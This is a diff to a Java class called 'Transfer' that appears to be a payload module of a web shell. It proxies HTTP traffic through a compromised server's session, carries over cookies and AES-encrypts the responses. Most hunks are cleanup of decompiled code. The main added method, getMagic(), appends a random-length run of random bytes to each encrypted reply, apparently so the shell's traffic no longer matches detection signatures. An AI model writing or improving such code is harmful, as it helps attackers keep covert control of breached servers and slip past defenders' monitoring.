@@ -15,6 +15,7 @@ import java.util.Enumeration;
 import java.util.HashMap;
 import java.util.Iterator;
 import java.util.Map;
+import java.util.Random;
 import java.util.zip.GZIPInputStream;
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
@@ -30,7 +31,7 @@ public class Transfer {
    private Object Session;
 
    public boolean equals(Object obj) {
-      HashMap result = new HashMap();
+      Map result = new HashMap();
 
       try {
          this.fillContext(obj);
@@ -85,7 +86,7 @@ public class Transfer {
                while(var17.hasNext()) {
                   headerLine = (String)var17.next();
                   if (headerLine != null && headerLine.equalsIgnoreCase("Set-Cookie")) {
-                     ((Map)so).put("Cookie", responseHeader.get(headerLine));
+                     ((Map)so).put("Cookie", (String)responseHeader.get(headerLine));
                   }
                }
 
@@ -139,9 +140,7 @@ public class Transfer {
 
    private byte[] readLine(InputStream in) throws IOException {
       ByteArrayOutputStream bos = new ByteArrayOutputStream();
-      boolean var3 = true;
-
-      int c;
+      int c = 0;
       while((c = in.read()) != -1 && c != 10 && c != 13) {
          bos.write(c);
       }
@@ -189,14 +188,13 @@ public class Transfer {
          String encoding = conn.getContentEncoding();
          DataInputStream din;
          byte[] buffer;
-         boolean var24;
          if (encoding != null) {
             if (encoding != null && encoding.equals("gzip")) {
                din = null;
                GZIPInputStream gZIPInputStream = new GZIPInputStream(conn.getInputStream());
                din = new DataInputStream(gZIPInputStream);
                buffer = new byte[1024];
-               boolean var13 = false;
+               length = 0;
 
                while((length = din.read(buffer)) != -1) {
                   bos.write(buffer, 0, length);
@@ -204,7 +202,7 @@ public class Transfer {
             } else {
                din = new DataInputStream(conn.getInputStream());
                buffer = new byte[1024];
-               var24 = false;
+               length = 0;
 
                while((length = din.read(buffer)) != -1) {
                   bos.write(buffer, 0, length);
@@ -213,7 +211,7 @@ public class Transfer {
          } else {
             din = new DataInputStream(conn.getInputStream());
             buffer = new byte[1024];
-            var24 = false;
+            length = 0;
 
             while((length = din.read(buffer)) != -1) {
                bos.write(buffer, 0, length);
@@ -236,7 +234,7 @@ public class Transfer {
       } else {
          DataInputStream din = new DataInputStream(conn.getErrorStream());
          byte[] buffer = new byte[1024];
-         boolean var21 = false;
+         length = 0;
 
          while((length = din.read(buffer)) != -1) {
             bos.write(buffer, 0, length);
@@ -253,7 +251,23 @@ public class Transfer {
       Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
       cipher.init(1, skeySpec);
       byte[] encrypted = cipher.doFinal(bs);
-      return encrypted;
+      ByteArrayOutputStream bos = new ByteArrayOutputStream();
+      bos.write(encrypted);
+      bos.write(this.getMagic());
+      return bos.toByteArray();
+   }
+
+   private byte[] getMagic() throws Exception {
+      String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
+      int magicNum = Integer.parseInt(key.substring(0, 2), 16) % 16;
+      Random random = new Random();
+      byte[] buf = new byte[magicNum];
+
+      for(int i = 0; i < buf.length; ++i) {
+         buf[i] = (byte)random.nextInt(256);
+      }
+
+      return buf;
    }
 
    private void fillContext(Object obj) throws Exception {
@@ -282,12 +296,12 @@ public class Transfer {
             this.getClass();
             Base64 = Class.forName("java.util.Base64");
             Decoder = Base64.getMethod("getDecoder", (Class[])null).invoke(Base64, (Object[])null);
-            result = (byte[])((byte[])Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, text));
+            result = (byte[])Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, text);
          } else {
             this.getClass();
             Base64 = Class.forName("sun.misc.BASE64Decoder");
             Decoder = Base64.newInstance();
-            result = (byte[])((byte[])Decoder.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder, text));
+            result = (byte[])Decoder.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder, text);
          }
       } catch (Exception var6) {
       }
